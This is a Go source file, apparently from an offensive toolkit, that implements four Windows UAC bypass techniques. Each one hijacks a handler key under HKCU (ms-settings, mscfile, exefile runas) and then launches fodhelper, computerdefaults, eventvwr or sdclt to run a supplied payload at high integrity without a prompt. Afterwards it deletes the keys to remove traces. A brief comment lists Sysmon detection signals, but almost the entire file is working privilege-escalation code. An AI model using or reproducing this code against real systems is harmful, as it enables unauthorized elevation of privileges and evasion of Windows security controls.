package priv

/*
	UAC Bypass via Registry Hijack

	Exploits auto-elevating Microsoft binaries that read HKCU before
	executing a command. Since HKCU is writable without admin, we set
	a registry key pointing to our payload, launch the auto-elevating
	binary, and get code execution at high integrity — no UAC prompt.

	Techniques:
	1. fodhelper.exe  — ms-settings protocol handler hijack
	2. computerdefaults.exe — ms-settings protocol handler hijack (alt binary)
	3. eventvwr.exe   — mscfile handler hijack
	4. sdclt.exe      — exefile runas handler hijack (Win10+)

	Each technique:
	- Writes to HKCU (no admin required)
	- Launches a Microsoft-signed auto-elevating binary
	- The binary reads HKCU and executes our payload elevated
	- Cleans up the registry key after launch

	Detection surface (good for building rules):
	- Sysmon Event 13: registry value set on known hijack keys
	- Sysmon Event 1: unexpected child process of fodhelper/eventvwr/sdclt
	- Parent-child anomaly: fodhelper.exe spawning cmd.exe or powershell.exe
*/

import (
	"fmt"
	"os/exec"
	"time"

	"golang.org/x/sys/windows/registry"
)

type UACBypassMethod int

const (
	BypassFodHelper UACBypassMethod = iota
	BypassComputerDefaults
	BypassEventVwr
	BypassSdclt
)

func UACBypass(method UACBypassMethod, payloadPath string) error {
	switch method {
	case BypassFodHelper:
		return bypassFodHelper(payloadPath)
	case BypassComputerDefaults:
		return bypassComputerDefaults(payloadPath)
	case BypassEventVwr:
		return bypassEventVwr(payloadPath)
	case BypassSdclt:
		return bypassSdclt(payloadPath)
	default:
		return fmt.Errorf("unknown UAC bypass method")
	}
}

// fodhelper.exe reads ms-settings shell command from HKCU
func bypassFodHelper(payloadPath string) error {
	keyPath := `Software\Classes\ms-settings\shell\open\command`

	key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("create key: %w", err)
	}

	err = key.SetStringValue("", payloadPath)
	if err != nil {
		key.Close()
		return fmt.Errorf("set default value: %w", err)
	}

	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		key.Close()
		return fmt.Errorf("set DelegateExecute: %w", err)
	}
	key.Close()

	cmd := exec.Command("cmd.exe", "/C", "start", "fodhelper.exe")
	cmd.Start()

	time.Sleep(3 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, keyPath)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)

	return nil
}

// computerdefaults.exe — same ms-settings hijack, different trigger binary
func bypassComputerDefaults(payloadPath string) error {
	keyPath := `Software\Classes\ms-settings\shell\open\command`

	key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("create key: %w", err)
	}

	err = key.SetStringValue("", payloadPath)
	if err != nil {
		key.Close()
		return err
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		key.Close()
		return err
	}
	key.Close()

	cmd := exec.Command("cmd.exe", "/C", "start", "computerdefaults.exe")
	cmd.Start()

	time.Sleep(3 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, keyPath)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)

	return nil
}

// eventvwr.exe reads mscfile handler from HKCU
func bypassEventVwr(payloadPath string) error {
	keyPath := `Software\Classes\mscfile\shell\open\command`

	key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("create key: %w", err)
	}

	err = key.SetStringValue("", payloadPath)
	if err != nil {
		key.Close()
		return err
	}
	key.Close()

	cmd := exec.Command("cmd.exe", "/C", "start", "eventvwr.exe")
	cmd.Start()

	time.Sleep(3 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, keyPath)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell\open`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)

	return nil
}

// sdclt.exe reads exefile runas handler from HKCU (Windows 10+)
func bypassSdclt(payloadPath string) error {
	keyPath := `Software\Classes\exefile\shell\runas\command`

	key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("create key: %w", err)
	}

	err = key.SetStringValue("", payloadPath)
	if err != nil {
		key.Close()
		return err
	}
	err = key.SetStringValue("IsolatedCommand", payloadPath)
	if err != nil {
		key.Close()
		return err
	}
	key.Close()

	cmd := exec.Command("cmd.exe", "/C", "start", "sdclt.exe")
	cmd.Start()

	time.Sleep(3 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, keyPath)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\shell\runas`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\shell`)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile`)

	return nil
}
